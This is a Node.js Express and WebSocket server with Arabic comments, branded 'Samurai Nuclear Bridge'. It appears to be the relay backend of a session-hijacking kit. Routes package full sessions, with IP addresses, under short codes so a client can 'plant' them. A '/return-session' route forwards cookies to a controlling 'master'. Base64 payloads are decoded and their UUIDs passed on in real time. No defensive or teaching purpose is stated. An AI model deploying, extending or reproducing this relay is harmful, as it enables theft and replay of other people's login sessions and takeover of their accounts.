const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();

// السماح بطلبات من جميع النطاقات (CORS)
app.use(cors());

// 🔥 مهم جداً: زيادة الحد الأقصى لحجم البيانات لأن الجلسة الكاملة والبايلود قد تكون كبيرة
app.use(express.json({ limit: '50mb' }));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// خريطة لتخزين اتصالات الماستر النشطة (session_id -> WebSocket)
const activeMasters = new Map();
// خريطة لتخزين بيانات الجلسات القصيرة في ذاكرة السيرفر (shortCode -> sessionData)
const shortSessions = new Map();

// ==========================================
// 1. العقل المركزي (WebSocket Router) - النقل اللحظي بين الكليان والماستر
// ==========================================
wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            // أ. تسجيل الماستر عند إنشائه للرابط
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                activeMasters.set(data.session_id, ws);
                console.log(`[MASTER LINKED] Session ID: ${data.session_id}`);

                // تنظيف الاتصال عند خروج الماستر
                ws.on('close', () => {
                    activeMasters.delete(data.session_id);
                    console.log(`[MASTER DISCONNECTED] Session ID: ${data.session_id}`);
                });
            } 
            // ب. 🚀 توجيه أي رسالة قادمة من الكليان (مثل البايلود أو الإشعارات) مباشرة للماستر
            else if (data.session_id && data.type !== 'REGISTER_MASTER') {
                const masterWs = activeMasters.get(data.session_id);
                
                if (masterWs && masterWs.readyState === WebSocket.OPEN) {
                    masterWs.send(JSON.stringify(data));
                    console.log(`[FORWARDED TO MASTER] Type: ${data.type} | Session: ${data.session_id}`);
                } else {
                    console.warn(`[WARNING] Master not found or disconnected for session: ${data.session_id}`);
                }
            }
        } catch (err) {
            console.error('WebSocket parsing error:', err);
        }
    });
});

// ==========================================
// 2. نظام الروابط القصيرة وتناقل الجلسة (HTTP)
// ==========================================

// أ: مسار لإنشاء كود قصير وحفظ الجلسة الكاملة القادمة من الماستر
app.post('/create-short-link', (req, res) => {
    const { sessionData } = req.body;
    
    if (!sessionData) {
        return res.status(400).json({ error: "No session data provided" });
    }

    // توليد كود عشوائي من 6 أحرف وأرقام
    const shortCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    
    // حفظ البيانات في السيرفر وربطها بالكود
    shortSessions.set(shortCode, sessionData);
    console.log(`[SESSION PACKAGED] Short Code: ${shortCode} | IP Included: ${!!sessionData.ip_address}`);

    // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة لتفادي استهلاك الذاكرة
    setTimeout(() => {
        shortSessions.delete(shortCode);
        console.log(`[SESSION EXPIRED] Short Code deleted: ${shortCode}`);
    }, 15 * 60 * 1000);

    res.json({ success: true, shortCode: shortCode });
});

// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه الكليان لزرع الجلسة والبدء)
app.get('/get-session-data/:code', (req, res) => {
    const code = req.params.code;
    const data = shortSessions.get(code);

    if (data) {
        res.json({ success: true, data: data });
    } else {
        res.status(404).json({ success: false, error: "Session expired or invalid" });
    }
});

// ==========================================
// 3. مسارات HTTP الاحتياطية (للتوافق القديم إن وُجد)
// ==========================================

// أ: مسار الترحيل العكسي - إرسال الكوكيز للماستر (تم استبداله بالـ WS ولكنه موجود كاحتياط)
app.post('/return-session', (req, res) => {
    const { session_id, final_session } = req.body;
    
    const masterWs = activeMasters.get(session_id);
    if (masterWs && masterWs.readyState === WebSocket.OPEN) {
        masterWs.send(JSON.stringify({ 
            type: 'SESSION_RETURNED', 
            final_session: final_session 
        }));
        console.log(`[SUCCESS] Verified Session returned to Master for ID: ${session_id}`);
    } else {
        console.warn(`[WARNING] Master disconnected. Could not return session for ID: ${session_id}`);
    }
    
    res.json({ success: true });
});

// ب: مسار نقل التتبع اللحظي (HTTP Fallback)
app.post('/', (req, res) => {
    const { session_id, type, payload, reason } = req.body;

    if (!session_id) {
        return res.status(400).json({ success: false, error: 'Missing session_id' });
    }

    const masterWs = activeMasters.get(session_id);
    const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;

    if (payload) {
        try {
            const decodedStr = Buffer.from(payload, 'base64').toString('utf-8');
            const parsedPayload = JSON.parse(decodedStr);
            const uuid = parsedPayload.result;

            if (isMasterConnected) {
                masterWs.send(JSON.stringify({ type: 'UUID_RECEIVED', uuid: uuid }));
            }
            return res.json({ success: true }); 
        } catch (err) {
            console.error('Payload decoding error:', err);
            return res.status(500).json({ success: false, error: 'Invalid payload formatting' });
        }
    }

    if (type) {
        if (isMasterConnected) {
            masterWs.send(JSON.stringify({
                type: type,
                reason: reason || null
            }));
        }
        return res.json({ success: true });
    }

    return res.status(400).json({ success: false, error: 'Invalid request body' });
});

// ==========================================
// 4. مسار الفحص (Health Check)
// ==========================================
app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: monospace; padding: 50px; text-align: center; background: #000; color: #00ff9d; height: 100vh; overflow: hidden; margin: 0;">
            <h1 style="font-size: 3rem; margin-bottom: 10px;">SAMURAI NUCLEAR SERVER IS ONLINE 🚀</h1>
            <p style="font-size: 1.5rem; color: #aaa;">Full Session & Payload Replay Architecture is running securely...</p>
            <div style="margin-top: 50px; padding: 20px; border: 2px solid #00ff9d; display: inline-block; border-radius: 10px;">
                <span style="color: #ffcc00; font-weight: bold;">[WEBSOCKET ROUTER:]</span> ACTIVE
            </div>
        </div>
    `);
});

// ==========================================
// 5. تشغيل السيرفر
// ==========================================
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`[SERVER] Samurai Nuclear Bridge listening on port ${PORT}`);
});
